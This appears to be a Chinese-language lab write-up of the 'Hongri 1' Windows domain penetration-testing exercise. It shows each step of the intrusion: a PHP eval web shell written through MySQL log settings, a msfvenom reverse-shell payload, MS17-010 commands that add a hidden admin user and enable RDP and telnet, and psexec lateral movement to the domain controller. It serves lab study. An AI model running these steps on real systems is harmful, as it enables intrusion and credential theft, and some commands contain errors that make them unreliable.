---
title: 红日1
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-17T20:23:53+08:00
categories: 
- 渗透测试
- 靶机练习
---

## 环境搭建

为边界机win7添加网卡，卡一设置为Vmnet1(仅主机模式)，卡二设置为net,其余两台内网机设置为Vmnet1

最终得到的ip环境如下

```
win7 
外网ip 192.168.121.155 内网ip 192.168.52.143
win2003
192.168.52.141
win2008
192.168.52.138
```

win7能够访问外网，内网机无法ping通，在win7中启动phpstudy开启web服务

无法启动phpstudy时可手动启动apache2.4和mysql

## 信息收集+外网getshell

访问win7的外网ip即可看到phpstudy探针，说明搭建成功

先扫描该外网ip开放端口![namp](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\namp.png)

能够看到开放了三个端口，分别是135,80和3306的mysql服务

扫描一下目录结构![win7dir](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\win7dir.png)

扫描到phpmyadmin的后台，以及备份文件，备份文件能够下载，打开发现YXCMS源码配置，能够访问到yxcms的页面

![yxcms](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\yxcms.png)

尝试登录phpmyadmin的后台，通过弱口令root,root成功登录

![phpmyadmin](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\phpmyadmin.png)

在phpmyadmin中查询到yxcms中admin账户密码

![yxcms-admin](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\yxcms-admin.png)

通过md5解密得到

```
949ba59abbe56e05
```

但是无法登录，打算用phpmyadmin后台协助获取shell,我们可以执行任意的sql查询，并且mysql版本为5.5.53,文件操作权限为只读值，我们无法对其进行修改，但是我们可以修改日志变量来进行写码

![var_log](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\var_log.png)

此时我们执行查询语句

```
select '<?php @eval($_POST[1]);?>';
```

就能写入shell到目标路径，但是这里路径是错误的，所以并没有连上蚁剑,我们需要重新获取路径，将路径改为WWW(phpstudy默认大写)，成功写入并且连上蚁剑

![蚁剑](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\蚁剑.png)

使用CS生成后门文件

![cs](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\cs.png)

上传到蚁剑并执行，成功上线cs

## 系统信息收集+内网信息收集

在系统中执行命令如下

```
sleep 0
shell whoami
```

![shell-whoami](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\shell-whoami.png)

查看windows安装的补丁

![win7-systeminfo](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\win7-systeminfo.png)

安装了4个补丁，并且看到内网ip为192.168.52.143，利用cs上的工具进行提权（走个过场）

![权限提升](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\权限提升.png)

**内网信息收集**

对内网ip进行C段扫描

![内网C段](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\内网C段.png)

得到剩下的两台机器，查看其开放的端口

![内网开放端口](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\内网开放端口.png)

**域信息收集**

```
net view /domain
```

发现存在域

![domain](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\domain.jpg)

```
net view
```

查询同域机器

![同域机器](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\同域机器.png)

抓取明文密码

![明文密码](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\明文密码.png)

```
net time /domain  ==>判断主域
==> owa
net user /domain 查询域用户
```

整理一下信息

域: god.org

域内三个用户： Administrator、ligang、liukaifeng01

域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA

域控：OWA(192.168.52.138)

## 横向移动

**socks代理**

反向代理的目的旨在用已经拿下的主机作为跳板，使流量走该机器访问内网

cs启一个socks代理，端口为8888

在攻击机kali上编辑

![sock代理](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\sock代理.png)

尝试使用namp扫描内网ip

```
proxychains nmap -Pn -sT -p 3389 192.168.52.138
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 13:41 EDT
[proxychains] Strict chain  ...  192.168.121.155:8888  ...  timeout
Nmap scan report for 192.168.52.138 (192.168.52.138)
Host is up (0.00030s latency).

PORT     STATE  SERVICE
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds

```

成功扫描，但是在扫描大量ip时会遇到timeout的问题导致扫描失败，尝试调低扫描速度即可

扫描另一台主机

```shell
┌──(root㉿kali)-[~]
└─# proxychains nmap -sS -sV -Pn 192.168.52.141
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 13:42 EDT
Nmap scan report for 192.168.52.141 (192.168.52.141)
Host is up (0.0011s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  tcpwrapped
139/tcp  open  tcpwrapped
777/tcp  open  tcpwrapped
1025/tcp open  tcpwrapped
1030/tcp open  tcpwrapped
7001/tcp open  tcpwrapped
7002/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```

很显然这里被墙了，扫描失败，重新再扫一下，应该是代理不稳定的问题(这个问题后面也没有解决)，但是经过多次扫描，能够看到i开放了几个比较重要的端口，并且对这几个重要的端口进行了服务探测，又重新采用了cs中的端口扫描功能进行探测

141的扫描结果

![cs-port-root](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\cs-port-root.jpg)

owa的扫描结果

![cs-post-owa](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\cs-post-owa.png)

当我们没办法直接拿下域控主机时，先尝试拿下第二台跳板机，可以看到第二台机器开放445端口和21ftp服务，445端口存在ms17_010,ftp可尝试未授权

尝试永恒之蓝，由于cs传shell给msf一直失败，所以重新用msf去拿一个shell

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.121.135 LHOST=4444 -f exe > shell.exe
```

生成shell文件后，msf开启对应ip端口的监听

![msf-listin](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\msf-listin.png)

但是迟迟没法上线，重新回到直接建立代理上，检查发现自己的ip给错了应该为teamserver的ip，重新修改文件后再次进行扫描

![namp-new](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\namp-new.png)

这下成功扫描了，令人感慨，开始给msf挂上代理

```
setg Proxies socks4:192.168.121.135:6666
```

用msf链接隧道，setg为全局代理，后面再使用就不需要重新输入，测试目标的445端口

![141-445](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\141-445.png)

成功通过隧道进行扫描,对445端口测试永恒之蓝

```
use auxiliary/admin/smb/ms17_010_command

set COMMAND net user

set RHOST 192.168.52.141

exploit
```

发现成功执行命令

![141-net-user](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\141-net-user.png)

对目标机器添加用户

```
set COMMAND net user hacker uu2@123 /add
```

![141-net-user-add](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\141-net-user-add.jpg)

成功添加用户，为新用户添加管理员权限

```
set COMMAND net localgroup administrators hacker /add  #添加管理员权限
```

手动开启3389端口

```
set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
```

![141-3389-open](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\141-3389-open.png)

开启后使用rdesktop去连接

![141-rdesktop](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\141-rdesktop.png)

这里的账户密码用我们新建的即可，成功登录目标主机，开始打shell回来

利用exploit/windows/smb/ms17_010_psexec ，创建windows/meterpreter/bind_tcp的正向shell,可是msf的session只是不断地增加，并没有返回shell

尝试利用telnet进行连接，直接利用远程桌面，手动开启telnet服务

```
sc config tlntsvr start= auto
net start telnet
netstat -an
```

![141-23](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\141-23.png)

23端口已成功开放，直接在kali上连接

![hacker-telnet](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\hacker-telnet.png)

成功拿下第二台主机的shell,最终目的是拿下域控主机

### 域控主机

之前已经抓去了明文密码，可以尝试直接用cs上线域控主机

首先创建SMB的监听器，名称随意

![smblis](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\smblis.png)

通过横向移动模块执行psexec，利用抓取的明文密码进行域控主机的上线

![域控主机上线](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\域控主机上线.png)

同样的方法使用msf中的psexec进行上线

![msf上线](E:\笔记软件\笔记\渗透测试\靶机练习\红日1\msf上线.png)

根据第一台主机的思路对这台主机仍然有效，就不再做复现了，至此三台主机全部上线

#### 小结:

第一次做这种不出网的靶机，思路比较乱，也有很多东西不会，一边记录一边慢慢的做下来了，主要还是看别人的WP进行参考，msf和cs两个工具怎么使用还不太清楚，做完这个机器倒是有点头绪了，争取越来越熟练。

## 参考链接：

https://www.freebuf.com/articles/web/324441.html

https://www.cnblogs.com/yokan/p/14021537.html

https://teamssix.com/200419-150644.html
